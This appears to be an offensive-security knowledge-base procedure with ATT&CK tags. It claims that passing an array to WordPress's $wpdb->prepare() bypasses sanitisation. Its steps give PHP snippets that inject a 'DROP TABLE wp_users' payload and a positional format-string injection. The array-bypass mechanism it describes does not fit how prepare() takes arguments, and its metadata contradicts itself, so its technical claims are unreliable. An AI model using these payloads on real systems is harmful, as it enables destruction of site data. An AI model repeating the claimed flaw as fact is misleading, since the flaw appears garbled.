---
id: proc-array-handling-demo
tags:
  - sqli
  - wordpress
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/test-format-string-attack-in-prepare]]'
verified: false
platforms:
  - Web
  - WordPress
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:19.780Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate-Array-Handling-Issue-in-WordPress-Prepare

## Summary

This procedure demonstrates the flaw in $wpdb->prepare() where passing an array as the first argument bypasses processing of further arguments, allowing direct insertion of malicious SQL into the query.

## Description

The prepare method checks if the first argument is an array and uses its values directly without sanitizing or processing additional parameters. This can be exploited in any WordPress code using prepare() with user-controlled arrays, leading to injection. Test in a local WordPress environment by modifying a plugin or using a custom script.

## Requirements

1. WordPress installation with debug mode enabled
2. PHP access to execute custom code
3. Knowledge of SQL syntax for payloads

## Defense

Defensive measures and detection strategies:

- Avoid passing arrays to prepare(); validate inputs strictly
- Audit all prepare() calls in custom code
- Use query logging to detect unsanitized arrays

## Objectives

1. Reproduce the array bypass
2. Inject a sample SQL payload
3. Observe query execution without sanitization

## Instructions

### Step 1: Craft Array Input

**Context**: Prepare an array containing the query template and payload.

Define $query_array = array("SELECT * FROM wp_users WHERE id = %d", "1; DROP TABLE wp_users; --");

### Step 2: Call Prepare with Array

**Context**: Invoke prepare() with the array as first argument.

Execute in a function hooked to init:

```php
$prepared = $wpdb->prepare($query_array, 1);
$wpdb->query($prepared);
```

> The second argument is ignored, and the payload from the array injects directly. Expected output: Executed query with unsanitized DROP statement.

### Step 3: Verify Injection

**Context**: Check database for effects.

Use [[commands/test-format-string-attack-in-prepare]] for a related format attack demo:

```php
$wpdb->prepare("%1$%s%2$%s%2$%s %s %s", $input['one'], $input['two']);
```

> With $input['one'] empty and $input['two'] as payload, injection occurs.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/test-format-string-attack-in-prepare]]

## Tools Used


## Tags

- sqli
- wordpress
